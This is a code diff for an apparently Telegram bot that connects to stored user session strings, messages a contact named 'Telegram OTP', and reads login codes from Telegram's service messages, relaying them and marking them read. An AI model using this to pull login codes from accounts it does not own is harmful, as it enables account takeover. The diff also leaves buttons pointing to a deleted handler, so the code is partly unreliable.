@@ -133,8 +133,10 @@ async def get_otp(client, message):
     if not user_sessions:
         return await message.reply("⚠️ You have no active sessions. Use /login to add a session.")
 
-    text = "🔹 **Your Active Sessions:**\n\n"
+    possible_senders = ["+42777", "Telegram", "777000"]  # Possible OTP senders
+    text = "Your Active Sessions:\n"
     buttons = []
+    valid_sessions = []
 
     for i, session in enumerate(user_sessions, 1):
         try:
@@ -143,73 +145,51 @@ async def get_otp(client, message):
             me = await uclient.get_me()
             phone_number = me.phone_number
 
-            text += f"{i}. 📞 `{phone_number}`\n"
-            buttons.append([InlineKeyboardButton(f"Get OTP for {phone_number}", callback_data=f"fetch_otp_{i}")])
+            # **Step 1: Add Peer as Contact**
+            await uclient.invoke(
+                functions.contacts.ImportContacts(
+                    contacts=[
+                        types.InputPhoneContact(
+                            client_id=0, phone="+42777", first_name="Telegram", last_name="OTP"
+                        )
+                    ]
+                )
+            )
+
+            # **Step 2: Send a "hi" message to introduce the peer**
+            await uclient.send_message("+42777", "hi")
+            await asyncio.sleep(2)  # Wait for Telegram to process
+
+            # **Step 3: Fetch the latest OTP message**
+            latest_otp = None
+            latest_time = None
+
+            for sender in possible_senders:
+                async for msg in uclient.get_chat_history(sender, limit=5):
+                    if msg.text and "code" in msg.text:
+                        if not latest_time or msg.date > latest_time:
+                            latest_time = msg.date
+                            latest_otp = msg
+
+            if latest_otp:
+                await message.reply(f"📩 **Latest OTP for `{phone_number}`:**\n\n{latest_otp.text}")
+                await uclient.read_history(latest_otp.chat.id)  # Mark message as read
+            else:
+                await message.reply(f"⚠️ No new OTP messages found for `{phone_number}`.")
 
             await uclient.disconnect()
+            valid_sessions.append(session)
+            text += f"{i}. 📞 `{phone_number}`\n"
+            buttons.append([InlineKeyboardButton(f"Fetch OTP for {phone_number}", callback_data=f"fetch_otp_{i}")])
+
+        except AuthKeyUnregistered:
+            await db.remove_session(user_id, session)  # Remove expired session
         except Exception as e:
             print(f"DEBUG: Error in session {i}: {e}")
+            await message.reply(f"⚠️ Couldn't introduce peer for `{phone_number}`. Try logging in again.")
+
+    if not valid_sessions:
+        return await message.reply("⚠️ No valid sessions found. Please re-login.")
 
     keyboard = InlineKeyboardMarkup(buttons)
     await message.reply(text, reply_markup=keyboard)
-
-
-@Client.on_callback_query(filters.regex(r"fetch_otp_(\d+)"))
-async def fetch_otp_callback(client, query):
-    user_id = query.from_user.id
-    session_index = int(query.matches[0].group(1)) - 1
-    user_sessions = await db.get_sessions(user_id)
-
-    if session_index >= len(user_sessions):
-        return await query.answer("⚠️ No valid session found.", show_alert=True)
-
-    session_string = user_sessions[session_index]
-
-    try:
-        uclient = Client(":memory:", session_string=session_string, api_id=APP_ID, api_hash=API_HASH)
-        await uclient.connect()
-        me = await uclient.get_me()
-        phone_number = me.phone_number
-
-        # **Step 1: Add Peer as Contact**
-        await uclient.invoke(
-            functions.contacts.ImportContacts(
-                contacts=[
-                    types.InputPhoneContact(
-                        client_id=0, phone="+42777", first_name="Telegram", last_name="OTP"
-                    )
-                ]
-            )
-        )
-
-        # **Step 2: Send "hi" to introduce peer**
-        await uclient.send_message("+42777", "hi")
-        await asyncio.sleep(5)  # Wait for OTP to arrive
-
-        # **Step 3: Fetch latest OTP**
-        latest_otp = None
-        latest_time = None
-        possible_senders = ["+42777", "Telegram", "777000"]
-
-        for sender in possible_senders:
-            async for msg in uclient.get_chat_history(sender, limit=5):
-                if msg.text and "code" in msg.text:
-                    if not latest_time or msg.date > latest_time:
-                        latest_time = msg.date
-                        latest_otp = msg
-
-        if latest_otp:
-            await query.message.reply(f"📩 **Latest OTP for `{phone_number}`:**\n\n{latest_otp.text}")
-            await uclient.read_history(latest_otp.chat.id)  # Mark as read
-        else:
-            await query.answer(f"⚠️ No new OTP messages found for `{phone_number}`.", show_alert=True)
-
-        await uclient.disconnect()
-
-    except AuthKeyUnregistered:
-        await db.remove_session(user_id, session_string)  # Remove expired session
-        await query.answer("⚠️ Session expired. Please log in again.", show_alert=True)
-    except PeerIdInvalid:
-        await query.answer("⚠️ Cannot access OTP messages. Try again later.", show_alert=True)
-    except Exception as e:
-        await query.answer(f"❌ Error fetching OTP: {e}", show_alert=True)
